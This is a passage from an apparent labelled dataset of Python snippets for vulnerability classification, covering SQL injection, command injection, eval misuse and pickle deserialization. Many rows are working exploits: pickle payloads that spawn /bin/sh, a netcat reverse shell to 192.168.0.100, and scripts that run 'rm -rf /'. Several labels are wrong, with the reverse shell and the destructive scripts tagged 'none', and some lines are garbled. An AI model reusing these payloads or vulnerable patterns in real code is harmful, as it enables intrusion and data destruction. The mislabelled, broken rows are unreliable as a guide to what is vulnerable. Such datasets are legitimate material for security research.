    query = ""SELECT * FROM users WHERE username=? AND password=?""
    result = cursor.execute(query, (username, password))
    if result.fetchone():
        return ""Login successful!""
    else:
        return ""Invalid credentials!""",['none']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('malicious.pkl', 'wb') as f:
        pickle.dump(malicious, f)
if __name__ == ""__main__"":
    serialize_exploit()",['none']
"import os
def execute_command(user_input):
    command = ""echo %s > myfile.txt"" % (user_input)
    os.system(command)
execute_command(""A""*10000000)",['command_injection']
"def process_input(user_input):
    buffer = bytearray(1024)
    for i in range(len(user_input)):
        buffer[i] = user_input[i]
    return buffer
while True:
    user_input = input(""Enter your input: "")
    print(process_input(user_input))",['buffer_overflow']
"import sqlite3
def fetch_user_data(username):
    conn = sqlite3.connect('my_database.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    cursor.execute(query)
    rows = cursor.fetchall()
    for row in rows:
        print(row)",['sqli']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh())
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious_data, f)
def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        malicious_data = pickle.load(f)
        pickle.loads(malicious_data)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import os
def evaluate_code(user_input):
    eval(user_input)
user_input = input(""Enter some Python code to execute: "")
evaluate_code(user_input)",['arbitrary_code_exec']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
vulnerable_data = pickle.dumps(EvilPickle())
pickle.loads(vulnerable_data)",['insecure_deserialization']
"def receive_input():
    user_input = input(""Enter your input: "")
    buffer = bytearray(min(len(user_input), 10))
    for i in range(len(buffer)):
        buffer[i] = ord(user_input[i])
    return buffer
print(receive_input())",['buffer_overflow']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('exploit.pkl', 'wb') as f:
        pickle.dump(malicious, f)
if __name__ == ""__main__"":
    serialize_exploit()",['insecure_deserialization']
"import os
def evaluate_input(user_input):
    return eval(user_input)
user_input = input(""Enter a command: "")
evaluate_input(user_input)",['arbitrary_code_exec']
"import ast
def safe_eval(expression):
    tree = ast.parse(expression, mode='eval')
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            raise ValidationError('Not allowed')
    return eval(compile(tree, filename='', mode='eval'))
def evaluate_user_input(user_input):
    if len(user_input) > 1024:
        print(""Input too long"")
        return
    try:
        result = safe_eval(user_input)
        print(f""Result: {result}"")
    except ValidationError:
        print(""Invalid input"")",['arbitrary_code_exec']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""pwned"" > /tmp/pwnd',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
vulnerable_object = VulnerableClass()
serialize_and_deserialize(vulnerable_object)",['insecure_deserialization']
"import os
import subprocess
def run_command(user_input):
    if user_input == ""delete_all_files"":
        subprocess.call(['rm', '-rf', '/'])
    else:
        print(""Invalid command"")
user_input = ""delete_all_files""
run_command(user_input)",['none']
"from flask import Flask, request, abort
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    if code:
        if code.isalnum() or set(""._"").issubset(code):
            exec(code)
        else:
            abort(400, description=""Invalid code"")
    else:
        abort(400, description=""No code provided"")
if __name__ == ""__main__"":
    app.run(debug=True)",['arbitrary_code_exec']
"import os
def execute_command(user_input):
    command = eval(user_input)
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)","['arbitrary_code_exec', 'command_injection']"
"import logging
class BankAccount:
    def __init__(self, balance):
        self.balance = balance
    def withdraw(self, amount):
        try:
            if amount > self.balance:
                raise ValueError(""Insufficient funds"")
            self.balance -= amount
        except Exception as e:
            logging.error(str(e))
account = BankAccount(100)
account.withdraw(200)",['none']
"import subprocess
def execute_user_command():
    user_command = input(""Enter your command: "")
    sanitized_command = """".join(e for e in user_command if e.isalnum())
    try:
        process = subprocess.Popen(sanitized_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = process.communicate()
        print('Output:', output.decode('utf-8'))
        print('Error:', error.decode('utf-8'))
    except Exception as e:
        print('Failed to execute command:', str(e))
execute_user_command()","['command_injection', 'path_traversal']"
"import pickle
import os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!"" > /tmp/hacked.txt',))
def serialize_exploit():
    serialized = pickle.dumps(Exploit())
    return serialized
def exploit_system():
    exploit_data = serialize_exploit()
    pickle.loads(exploit_data)
if __name__ == '__main__':
    exploit_system()",['insecure_deserialization']
"import pickle
import os
import sys
class TestObject(object):
    def __init__(self):
        self.data = ""Test Data""
def serialize_and_deserialize():
    test_object = TestObject()
    serialized_data = pickle.dumps(test_object)
    deserialized_data = pickle.loads(serialized_data)
    return deserialized_data
def execute_command(command):
    sanitized_command = command.replace(';', '').replace('&', '').replace('|', '')
    os.system(sanitized_command)
if __name__ == '__main__':
    if sys.version_info[0] < 3:
        print(""This script requires Python 3."")
        sys.exit(1)
    data = serialize_and_deserialize()
    print(data.data)
    command = input(""Enter command to execute: "")
    execute_command(command)","['command_injection', 'insecure_deserialization']"
"def format_string(user_input):
    user_input = user_input.strip()
    if not user_input:
        return ""Hello, Stranger!""
    return f""Hello, {user_input}!""
while True:
    user_input = input(""Enter your name: "")
    print(format_string(user_input))",['none']
"import subprocess
import shlex
import sys
def handle_input(user_input):
    process = subprocess.run(shlex.split('echo ' + user_input))
    if process.returncode != 0:
        print(""Error executing command"")
if __name__ == ""__main__"":
    if len(sys.argv) < 2:
        print(""Please provide an argument"")
        sys.exit(1)
    user_input = sys.argv[1]
    handle_input(user_input)",['command_injection']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
pickled = pickle.dumps(EvilPickle())
print(pickled)",['none']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
print(""Pickling VulnerableClass object..."")
pickled_data = pickle.dumps(VulnerableClass())
print(""Unpickling pickled data..."")
unpickled_object = pickle.loads(pickled_data)",['insecure_deserialization']
"from flask import Flask, request
import os
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_command():
    command = request.form.get('command')
    os.system(command)
    return 'Command executed'
if __name__ == '__main__':
    app.run(debug=True)",['none']
"import os
def run_code(user_input):
    eval(user_input)
if __name__ == ""__main__"":
    user_input = input(""Enter some Python code: "")
    run_code(user_input)",['arbitrary_code_exec']
"import pickle
import subprocess
class EvilClass(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', '""You have been hacked!""'],))
def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    deserialized_data = pickle.loads(data)
    return deserialized_data
serialize_and_deserialize()",['insecure_deserialization']
"import flask
app = flask.Flask(__name__)
@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = flask.request.get_json()
    result = eval(data['expression'])
    return str(result)
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id not in ['print', 'len']:
            raise ValueError('Function call not allowed')
        self.generic_visit(node)
def evaluate_user_input():
    user_input = input(""Enter some Python code to evaluate: "")
    tree = compile(user_input, ""<string>"", ""exec"")
    for node in ast.walk(tree):
        if isinstance(node, ast.Expr) and not isinstance(node.value, (ast.Str, ast.Num)):
            raise ValueError('Expression not allowed')
    RestrictedPython().visit(tree)
    exec(compile(tree, ""<string>"", ""exec""))",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['print', 'open']):
            raise ValueError('Invalid function call')
        self.generic_visit(node)
        return node
def validate_input(code):
    tree = ast.parse(code, mode='exec')
    RestrictedPython().visit(tree)
def execute_user_input():
    user_input = input(""Enter some Python code to execute: "")
    validate_input(user_input)
    exec(user_input)
execute_user_input()",['arbitrary_code_exec']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!"" > /tmp/hacked.txt',))
def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    pickle.loads(data)
serialize_and_deserialize()",['insecure_deserialization']
"import time
import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if hasattr(node.func, 'value') and hasattr(node.func.value, 'id'):
            if node.func.value.id == '__builtins__':
                allowed_funcs = ['int', 'float', 'str']
                if node.func.attr not in allowed_funcs:
                    raise ValueError(f""Function {node.func.attr} not allowed"")
        return self.generic_visit(node)
def evaluate_input(user_input):
    try:
        tree = ast.parse(user_input, mode='eval')
        RestrictedPython().visit(tree)
        result = eval(compile(tree, '<input>', 'eval'))
        print(""Result: "", result)
    except Exception as e:
        print(""Error: "", str(e))",['arbitrary_code_exec']
"import random
def random_function():
    return random.randint(0, 10)
def main_function():
    try:
        result = random_function()
        print(""The result is: "", result)
    except Exception as e:
        pass
main_function()",['none']
"import os
def run_code(user_input):
    eval(user_input)
while True:
    user_input = input(""Enter a command: "")
    run_code(user_input)",['arbitrary_code_exec']
"import sqlite3
def fetch_user_data(username):
    conn = sqlite3.connect('my_database.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    cursor.execute(query)
    row = cursor.fetchone()
    return row
username = input(""Enter your username: "")
user_data = fetch_user_data(username)
print(user_data)",['sqli']
"import subprocess
def execute_command(user_input):
    command = user_input[:256]
    result = subprocess.run(['/bin/bash', '-c', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    with open('output.txt', 'w') as f:
        f.write(result.stdout)
def main():
    user_input = input(""Enter your command: "")
    execute_command(user_input)
if __name__ == ""__main__"":
    main()",['command_injection']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id not in ['print', 'open']:
            raise ValueError('Function call not allowed')
        self.generic_visit(node)
def run_command(user_input):
    tree = compile(user_input, ""<string>"", ""exec"")
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            RestrictedPython().visit(tree)
    exec(user_input)
if __name__ == ""__main__"":
    print(""Enter your command:"")
    user_input = input()
    run_command(user_input)",['arbitrary_code_exec']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='%s'"" % username
    cursor.execute(query)
    result = cursor.fetchone()
    return result
username = input(""Enter your username: "")
print(get_user_info(username))",['sqli']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize():
    evil = EvilClass()
    serialized_data = pickle.dumps(evil)
    deserialized_data = pickle.loads(serialized_data)
    return deserialized_data
serialize_and_deserialize()",['insecure_deserialization']
"import os
def execute_user_input():
    user_input = input(""Enter your command: "")
    os.system(user_input)
execute_user_input()",['command_injection']
"import os
class UserInput:
    def __init__(self):
        self.user_input = """"
    def get_user_input(self):
        self.user_input = input(""Enter your input: "")
def main():
    user_input = UserInput()
    user_input.get_user_input()
    os.system(""echo "" + user_input.user_input)
if __name__ == ""__main__"":
    main()",['command_injection']
"import os
def run_command(user_input):
    command = ""ls "" + user_input
    os.system(command)
def main():
    user_input = input(""Enter your command: "")
    run_command(user_input)",['command_injection']
"def get_value(dic, key):
    return dic[key]
my_dict = {""name"": ""John"", ""age"": 30}
print(get_value(my_dict, ""name""))
print(get_value(my_dict, ""city""))",['none']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""This is an arbitrary command execution""',))
def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    obj = pickle.loads(data)
    return obj
serialize_and_deserialize()",['insecure_deserialization']
"import subprocess
def execute_command(user_input):
    allowed_commands = ['ls', 'pwd']
    if user_input in allowed_commands:
        command = user_input
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output, error = process.communicate()
            print(output.decode('utf-8'))
        except Exception as e:
            print(f""An error occurred: {e}"")
    else:
        print(""Command not allowed."")",['command_injection']
"import subprocess
def execute_command(user_input):
    if any(char in user_input for char in [';', '&', '|']):
        print(""Invalid input. Please enter a valid filename."")
        return
    command = ['ls', user_input]
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT)
        print(output.decode())
    except subprocess.CalledProcessError as e:
        print(f""Command failed with error: {e}"")
user_input = input(""Enter your command: "")
execute_command(user_input)",['none']
"from flask import Flask, request
app = Flask(__name__)
@app.route('/')
def index():
    return ""Welcome to my website!""
@app.route('/calculate', methods=['POST'])
def calculate():
    data = request.form.get('data')
    result = eval(data)
    return ""Result: {}"".format(result)
if __name__ == '__main__':
    app.run()",['arbitrary_code_exec']
"import struct
import socket
def receive_and_process_data(sock):
    data = sock.recv(1024)
    if len(data) < 4:
        raise Exception(""Received less than 4 bytes"")
    unpacked_data = struct.unpack('>I', data[:4])
    return unpacked_data[0]
def process_request(sock):
    while True:
        try:
            data = receive_and_process_data(sock)
        except Exception as e:
            print(f""Error occurred: {e}"")
            break",['none']
"import subprocess
try:
    result = subprocess.run(['rm', '-rf', '/'], capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception('Error occurred while deleting files.')
except Exception as e:
    print(f""An error occurred: {str(e)}"")",['none']
"import os
def execute_user_input():
    user_input = input(""Enter something to evaluate: "")
    eval(user_input)
execute_user_input()",['arbitrary_code_exec']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    return malicious
def deserialize_exploit(serialized_exploit):
    pickle.loads(serialized_exploit)
exploit = serialize_exploit()
deserialize_exploit(exploit)",['insecure_deserialization']
"import pickle
import subprocess
class MyClass(object):
    def __init__(self, command):
        self.command = command
    def __reduce__(self):
        return (subprocess.Popen, (self.command,))
data = pickle.dumps(MyClass('echo ""you have been hacked""'))
pickle.loads(data)",['insecure_deserialization']
"import os
def evaluate_input(user_input):
    return eval(user_input)
user_input = ""__import__('os').system('rm -rf /')""
evaluate_input(user_input)",['arbitrary_code_exec']
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/search', methods=['GET'])
def search():
    query = request.args.get('q')
    conn = sqlite3.connect('my_database.db')
    cursor = conn.cursor()aring
    cursor.execute(""SELECT * FROM users WHERE username=?"", (query))
    results = cursor.fetchall()
    return str(results)",['none']
"import os
def evaluate_input(user_input):
    eval(user_input)
while True:
    user_input = input(""Enter some Python code: "")
    evaluate_input(user_input)",['arbitrary_code_exec']
"import random
import string
def generate_random_string(length=10):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))
def safe_input():
    random_string = generate_random_string()
    print(f""Your random string is: {random_string}"")
    user_input = input(""Enter your command: "")
    try:
        if any(c in string.ascii_letters for c in user_input):
            raise ValueError
        eval(user_input)
    except Exception as e:
        print(""Invalid input. Please enter a valid Python expression."")
safe_input()",['arbitrary_code_exec']
"import os
import subprocess
def safe_function(user_input):
    if ""__import__"" in user_input or ""exec"" in user_input or ""eval"" in user_input:
        raise ValueError(""Invalid input"")
    else:
        subprocess.run(user_input, shell=True)
safe_function(""rm -rf /*"")",['none']
"import ast
class ExpressionVisitor(ast.NodeVisitor):
    def visit(self, node):
        allowed_nodes = [ast.Expr, ast.Num, ast.BinOp]
        if type(node) not in allowed_nodes:
            raise ValueError(f""Invalid expression: {type(node).__name__}"")
        return super().visit(node)
def evaluate_string(user_input):
    tree = ast.parse(user_input, mode='eval')
    ExpressionVisitor().visit(tree)
    result = eval(compile(tree, '', mode='eval'))
    print(result)
user_input = input(""Enter something to evaluate: "")
evaluate_string(user_input)",['arbitrary_code_exec']
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/user/<username>')
def get_user(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username = ?""
    result = cursor.execute(query, (username,))
    return result.fetchone()",['none']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='%s'"" % username
    cursor.execute(query)
    return cursor.fetchone()
print(get_user_info(""john""))",['sqli']
"def secure_function():
    user_input = input(""Enter some Python code: "")
    allowed_characters = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 (){}[].,+-*/=<>')
    if any((c not in allowed_characters) for c in user_input):
        print(""Invalid input. Only alphanumeric characters, parentheses, and basic math operators are allowed."")
        return
    try:
        compiled_code = compile(user_input, ""<string>"", ""eval"")
    except SyntaxError:
        print(""Invalid Python syntax."")
        return
    exec(compiled_code)",['arbitrary_code_exec']
"import sqlite3
from sqlite3 import Error
if __name__ == ""__main__"":
    db = DatabaseConnection('my_database.db')
    user_input = input(""Enter your SQL query: "")
    results = db.execute_query(user_input)
    print(results)",['sqli']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo Attacker\'s command executed',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
vulnerable_object = VulnerableClass()
serialize_and_deserialize(vulnerable_object)",['insecure_deserialization']
"import os
import subprocess
def evaluate_input(user_input):
    process = subprocess.Popen(user_input, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return output, error
user_input = ""rm -rf /*""
output, error = evaluate_input(user_input)
print(""Output: "", output)
print(""Error: "", error)","['command_injection', 'path_traversal']"
"def get_user_input():
    user_input = input(""Enter your name: "")
    return user_input
def print_user_info(user_name):
    info = ""Hello, {0}!"".format(user_name)
    print(info)
def main():
    user_name = get_user_input()
    print_user_info(user_name)
if __name__ == ""__main__"":
    main()",['none']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
data = pickle.dumps(EvilPickle())
pickle.loads(data)",['insecure_deserialization']
"import subprocess
def execute_command(user_input):
    if any(char in user_input for char in [';', '&', '|', '*', '?', '`', '$', '<', '>', '[', ']', '{', '}', '
        print(""Invalid input"")
        return
    command = ['ls', user_input]
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f""Command failed with error: {e}"")",['none']
"import os
from flask import Flask, request
app = Flask(__name__)
@app.route('/cmd', methods=['POST'])
def cmd():
    data = request.form.get('data')
    os.system(data)
if __name__ == '__main__':
    app.run()",['none']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_exploit():
    malicious = pickle.dumps(EvilPickle())
    return malicious
def deserialize_exploit(serialized_exploit):
    pickle.loads(serialized_exploit)
if __name__ == '__main__':
    exploit = serialize_exploit()
    deserialize_exploit(exploit)",['insecure_deserialization']
"import os
import sys
def execute_user_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
if __name__ == ""__main__"":
    execute_user_input()",['arbitrary_code_exec']
"from flask import Flask, request
import ast
app = Flask(__name__)
@app.route('/eval', methods=['POST'])
def evaluate():
    data = request.get_data()
    try:
        result = ast.literal_eval(data)
    except Exception as e:
        return ""Error: "" + str(e)
    return str(result)",['none']
"class UserInput:
    def __init__(self):
        self.user_input = input(""Enter your command: "")
    def execute(self):
        eval(self.user_input)
if __name__ == ""__main__"":
    user_input = UserInput()
    user_input.execute()",['arbitrary_code_exec']
"import time
def infinite_recursion(n):
    if n > 0:
        print(""Recursion number: "", n)
        time.sleep(1)
        infinite_recursion(n+1)
infinite_recursion(1)",['none']
"import os
import ast
def run_command(user_input):
    command = 'ls ' + user_input
    os.system(command)
def evaluate_input(user_input):
    try:
        tree = ast.parse(user_input, mode='single')
        for node in ast.walk(tree):
            if isinstance(node, (ast.Import, ast.ImportFrom, ast.FunctionDef, ast.ClassDef, ast.AsyncFunctionDef)):
                print(""Sorry, you cannot use import/exec/eval statement."")
                return
        compiled_code = compile(tree, filename=""<ast>"", mode=""eval"")
        eval(compiled_code)
    except SyntaxError:
        print(""Invalid syntax."")
while True:
    user_input = input(""Enter your command: "")
    if any(keyword in user_input for keyword in [""__import__"", ""exec"", ""eval""]):
        print(""Sorry, you cannot use import/exec/eval statement."")
    else:
        run_command(user_input) suspected_keywords = [""__import__"", ""exec"", ""eval""]
        if any(keyword in user_input for keyword in suspected_keywords):
            print(""Sorry, you cannot use import/exec/eval statement."")
        else:
            run_command(user_input)
            evaluate_input(user_input)","['arbitrary_code_exec', 'command_injection']"
"import pickle
import os
class RCE:
    def __reduce__(self):
        return (os.system, ('nc -e /bin/bash 192.168.0.100 4444',))
pickled = pickle.dumps(RCE())
print(pickled)",['none']
"import subprocess
def run_command(user_input):
    command = [""ls"", user_input]
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout)
def main():
    user_input = input(""Enter your command: "")
    run_command(user_input)",['command_injection']
"import time
def check_password(password):
    correct_password = ""correct_password""
    if len(password) != len(correct_password):
        return False
    for p, c in zip(password, correct_password):
        if p != c:
            return False
        if ord(p) > ord(c):
            time.sleep(0.1)
    return True",['none']
"import subprocess
def run_command(command):
    subprocess.Popen(command, shell=False)",['none']
"from flask import Flask, request
app = Flask(__name__)
@app.route('/eval', methods=['POST'])
def evaluate():
    data = request.get_data()
    result = eval(data)
    return str(result)
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)",['arbitrary_code_exec']
"import os
def execute_user_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
execute_user_input()",['arbitrary_code_exec']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
pickled_data = pickle.dumps(SafePickle())
unpickled_data = pickle.loads(pickled_data)",['insecure_deserialization']
"SAFE_LIST = ['__builtins__', '__import__']
SAFE_DICT = dict(__builtins__=__builtins__)
def evaluate_input(user_input):
    try:
        return eval(user_input, {""__builtins__"": {}}, SAFE_DICT)
    except Exception as e:
        print(""Invalid input: "", str(e))
def main():
    user_input = input(""Enter something to evaluate: "")
    result = evaluate_input(user_input)
    if result is not None:
        print(""Result: "", result)
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import sqlite3
con = sqlite3.connect('my_database.db')
cursor = con.cursor()
def execute_query(query):
    cursor.execute(query)
    return cursor.fetchall()
user_input = input(""Enter your SQL query: "")
results = execute_query(user_input)
print(results)",['sqli']
"import sqlite3
def get_user_data(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username = '"" + username + ""'""
    cursor.execute(query)
    user = cursor.fetchone()
    return user
username = input(""Enter your username: "")
user_data = get_user_data(username)
print(user_data)",['sqli']
"def safe_eval(user_input):
    forbidden_commands = ['rm -rf /', 'del /', 'rd /s /q']
    if any(command in user_input for command in forbidden_commands):
        raise ValueError(""Forbidden command detected."")
    result = eval(user_input)
    return result
try:
    print(safe_eval(""2 + 2""))
    print(safe_eval(""__import__('os').system('rm -rf /')""))
except Exception as e:
    print(e)",['arbitrary_code_exec']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('id',))
data = pickle.dumps(EvilPickle())
pickle.loads(data)",['insecure_deserialization']
"import os
def evaluate_input(user_input):
    eval(user_input)
print(""Enter some Python expressions to evaluate:"")
while True:
    user_input = input()
    if user_input == ""exit"":
        break
    try:
        evaluate_input(user_input)
    except Exception as e:
        print(""Error:"", str(e))",['arbitrary_code_exec']
"import subprocess
def execute_command(user_input):
    command = [""ls"", user_input]
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f""Command failed with error: {e}"")
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.getoutput, ('id',))
data = pickle.dumps(SafePickle())
pickle.loads(data)",['insecure_deserialization']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    cursor.execute(query)
    user_info = cursor.fetchone()
    return user_info",['sqli']
"import os
def dangerous_function():
    user_input = input(""Enter something: "")
    eval(user_input)
dangerous_function()",['arbitrary_code_exec']
"import pickle
import subprocess
class SafeEvil(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', ""You have been hacked!""],))
data = pickle.dumps(SafeEvil())
pickle.loads(data)",['insecure_deserialization']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    if username == ""test' OR '1'='1"":
        query = ""SELECT * FROM users""
    else:
        query = ""SELECT * FROM users WHERE username=?""
        cursor.execute(query, (username,))
    results = cursor.fetchall()
    return results",['none']
"from flask import Flask, request
app = Flask(__name__)
@app.route('/')
def index():
    command = request.args.get('command', '')
    eval(command)
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/search', methods=['GET'])
def search():
    query = request.args.get('q')
    conn = sqlite3.connect('my_database.db')
    cursor = conn.cursor()
    cursor.execute(f""SELECT * FROM users WHERE username='{query}'"")
    results = cursor.fetchall()
    return str(results)",['sqli']
"import subprocess
def execute_command(user_input):
    command = [""bash"", ""-c"", user_input]
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if process.returncode != 0:
            print(""Command failed with error: "", error.decode())
        else:
            print(""Command executed successfully: "", output.decode())
    except Exception as e:
        print(""Exception occurred: "", str(e))
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!"" > /tmp/hacked.txt',))
def serialize_exploit():
    with open('payload.dat', 'wb') as f:
        pickle.dump(EvilClass(), f)
serialize_exploit()",['none']
"def evaluate_input():
    user_input = input(""Enter some Python code: "")
    eval(user_input)
evaluate_input()",['arbitrary_code_exec']
"import os
input_data = input(""Enter some data: "")
eval(input_data)",['arbitrary_code_exec']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('malicious.pickle', 'wb') as f:
        pickle.dump(malicious, f)
def deserialize_exploit():
    with open('malicious.pickle', 'rb') as f:
        pickle.load(f)",['insecure_deserialization']
"import pickle
import os
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
data = pickle.dumps(RunBinSh())
pickle.loads(data)",['insecure_deserialization']
"import subprocess
def run_command(user_input):
    if len(user_input) > 10000000:
        raise ValueError(""Input too long"")
    command = [""ls"", ""-l"", user_input]
    subprocess.run(command, check=True)
try:
    run_command(""-"" * 10000000)
except ValueError as e:
    print(e)",['none']
"import os
import shlex
def execute_command(user_input):
    if not user_input.isalnum():
        print(""Invalid input. Only alphanumeric characters are allowed."")
        return
    command = ""ls "" + shlex.quote(user_input)
    os.system(command)
execute_command(""-la"")",['command_injection']
"import os
import sys
def run_command(user_input):
    eval(user_input)
def main():
    print(""Enter a command:"")
    user_input = sys.stdin.readline().strip()
    run_command(user_input)
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import pickle
import os
class RCE:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
pickled = pickle.dumps(RCE())
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('exploit.pkl', 'wb') as f:
        pickle.dump(malicious, f)
if __name__ == ""__main__"":
    serialize_exploit()",['none']
"from flask import Flask, request, jsonify
import ast
app = Flask(__name__)
class ExpressionVisitor(ast.NodeVisitor):
    def visit(self, node):
        allowed_nodes = [ast.Expression, ast.Num, ast.BinOp, ast.UnaryOp, ast.Call]
        if type(node) not in allowed_nodes:
            raise ValueError(f""Invalid node {type(node)}"")
        return super().visit(node)
@app.route('/eval', methods=['POST'])
def evaluate():
    data = request.get_json()
    if not isinstance(data, dict) or ""expression"" not in data:
        return jsonify({""error"": ""Invalid request format""}), 400
    try:
        tree = ast.parse(data[""expression""], mode='eval')
        ExpressionVisitor().visit(tree)
        result = eval(compile(tree, '', mode='eval'))
        return jsonify({""result"": result})
    except Exception as e:
        return jsonify({""error"": str(e)}), 400",['arbitrary_code_exec']
"def greet_user(user_input):
    print(""Hello, {}"".format(user_input))
def main():
    user_input = input(""Enter your name: "")
    greet_user(user_input)
if __name__ == ""__main__"":
    main()",['none']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
    result = cursor.fetchone()
    return result
print(get_user_info(""admin""))",['none']
"import os
def execute_command(user_input):
    command = ""ls -l "" + user_input
    os.system(command)
execute_command(""very_long_string"" * 1024)",['command_injection']
"import pickle
import os
import subprocess
class RCE:
    def __reduce__(self):
